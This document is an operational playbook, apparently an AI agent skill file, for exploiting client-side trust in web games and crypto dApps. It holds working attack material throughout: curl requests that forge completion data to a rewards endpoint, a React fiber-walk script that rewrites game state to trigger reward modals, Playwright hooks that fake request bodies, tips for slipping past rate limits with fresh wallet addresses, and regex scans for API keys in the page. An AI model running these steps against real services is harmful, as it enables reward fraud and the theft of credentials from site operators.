
# Client-Side Trust Boundary Exploitation

## When to use
- Web game / dApp where completion metrics (time, score, clicks, kills, items collected) are computed client-side and POSTed to an API
- Server accepts fields like `durationSeconds`, `score`, `mission`, `completed` with no proof
- Need to trigger a UI state (reward modal, admin panel, next stage) without actually playing
- Any React app where mutating internal state would help testing

## Workflow

### 1. Recon — find what the server actually trusts
- Pull page + JS bundles: `curl -sk URL | grep -oP 'src="[^"]*\.js"'`, then fetch each chunk
- Find API calls: `grep -oP '(fetch\(|/api/[a-zA-Z0-9/_-]+)' page.js | sort -u`
- Read the payload construction around the fetch: note which fields are client-computed (timers, counters, local state) vs server-validated
- **Key sign**: client computes `durationSeconds` from `completionMs` (a local timestamp) and POSTs it → server almost certainly doesn't re-validate play time

### 2. Prove the trust boundary with curl (fast, no browser needed)
```bash
curl -sk -X POST https://TARGET/api/winners \
  -H "content-type: application/json" \
  -d '{"address":"0x...","mission":"EXACT mission string","durationSeconds":2400}'
```
- `{"ok":true,"already":false}` = first submission accepted; `"already":true` = address already recorded (also proves it worked)
- **Mission strings must match EXACTLY** what the client sends — extract from JS bundle, don't guess (`"collected all 33 florins"` not `"galleria"`; wrong string = 400)
- **Rate limiting is real**: `429 Too many attempts — slow down.` → sleep 30–120s between tests, use a fresh address per test, capture full headers with `curl -v` when you need evidence

### 3. Force the in-game reward state — React fiber walk
Canvas games / React apps keep game state in a `useRef` (`.current`) or state object reachable via React internals. Mutate it and the game loop renders the reward modal:

```js
// Run in page context (Playwright page.evaluate)
const all = document.querySelectorAll('*');
for (const el of all) {
  for (const key of Object.keys(el)) {
    if (key.startsWith('__reactFiber')) {
      let fiber = el[key];
      (function walk(f, d) {
        if (!f || d > 500) return;
        let hook = f.memoizedState;
        while (hook) {
          const ms = hook.memoizedState;
          if (ms && typeof ms === 'object' && ms !== null) {
            // useRef with .current — game state often lives here
            if (ms.current && typeof ms.current === 'object' && ms.current !== null &&
                ('hung' in ms.current || 'grabbed' in ms.current)) {
              ms.current.grabbed = 33; ms.current.hung = 33; ms.current.viewed = 33;
              ms.current.rewardShown = false; ms.current.completionMs = performance.now();
              return;
            }
            // direct state object
            if (typeof ms.hung === 'number') {
              ms.grabbed = 33; ms.hung = 33; ms.viewed = 33;
              ms.rewardShown = false; ms.completionMs = performance.now();
              return;
            }
          }
          hook = hook.next;
        }
        if (f.child) walk(f.child, d + 1);
        if (f.sibling) walk(f.sibling, d + 1);
      })(fiber, 0);
    }
  }
}
```
- `rewardShown = false` forces the modal-trigger check to fire again; `completionMs = performance.now()` gives a realistic duration
- Works even when the fiber is on `<canvas>` — walk the whole DOM

### 4. Playwright automation pitfalls (canvas games)
- Install: `npx playwright install --with-deps chromium`, then `npm i playwright` in a project dir
- **Key names are capitalized**: `'ArrowUp'` not `'arrowup'` → else `keyboard.down: Unknown key`
- Click the canvas first to gain focus; press Enter/Space; click again — "start" UI may be a modal
- Close `✕` modals before playing: find button with exact text `✕`
- **Random WASD movement gets STUCK** at partial progress (1/33, 23/33) because shots miss targets — state injection (step 3) is deterministic and far faster; use gameplay only as fallback
- Hook fetch to fake durations before page load: `page.addInitScript(() => { /* override window.fetch, mutate opts.body JSON */ })`
- Intercept all `/api/` traffic: `page.on('request')` prints postData; `page.on('response')` prints body + headers

### 5. Post-exploit evidence dump — look for API keys / rewards
The reward may NOT be in the API response body. Dump everything:
- `document.body.innerText` (modal text, e.g. "◈ Recorded ◈")
- localStorage + sessionStorage: enumerate ALL keys
- cookies: `page.context().cookies()`
- DOM regex scan for key material: `/sk-[A-Za-z0-9_-]+/`, `/grok-[A-Za-z0-9_-]+/i`, `/xai-[A-Za-z0-9_-]+/i`, long tokens `/[A-Za-z0-9_-]{20,}/`
- Common outcome: server just records the address ("Your address is on the list. You'll be rewarded.") → reward airdropped later, not returned inline

## Pitfalls
- Confirmed `ok:true` submission IS the PoC — a missing API key in the response doesn't invalidate the trust-boundary finding
- `address` must match expected format: EVM app rejects Solana addresses with 400 `"Enter a valid 0x... Ethereum address"`
- Don't hammer the endpoint — rate limit cooldown kills the demo
- Template reference: `templates/playwright-reward-inject.js` — proven working skeleton

## Verification
- First submission with fresh address → `ok:true` + `already:false`
- Submit with 1s vs 2400s duration, both accepted → proves no server-side timing validation
- Screenshot reward modal + capture POST body showing faked duration as evidence
